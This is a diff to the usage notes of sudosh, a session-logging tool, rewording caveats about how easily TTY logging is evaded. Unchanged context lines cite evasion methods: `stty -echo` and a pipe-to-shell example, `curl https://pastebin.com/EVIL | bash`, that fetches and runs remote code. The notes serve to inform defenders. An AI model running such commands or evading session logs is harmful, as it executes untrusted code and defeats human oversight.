@@ -100,8 +100,8 @@ usage: |-
   * Using `requiretty`, will require passing a pseudo TTY, which is easily accomplished by instead running `ssh -tt user@host bash`
   * Users can easily circumvent logging of `stdin` by running `stty -echo`, however, you'll see the command run to disable it. =)
   * Users can easily run scripts (e.g. `curl https://pastebin.com/EVIL | bash`) which would circumvent the ability to see what was executed
-  * There are 1000+ ways bad actors can circumvent *any* form of TTY logging. 
-  * Using this method of session logging only recommended to keep an *honest* log of what happened.
+  * There are 1000+ ways bad actors can circumvent *any* form of TTY logging (not unique to `sudosh`). 
+  * TTY Session logging is only recommended to keep an *honest* log of what happened.
   * Capturing a byte-for-byte session log requires extension of the SSH server or perhaps a custom shell built specificically for that purpose. 
 
 # Contributors to this project
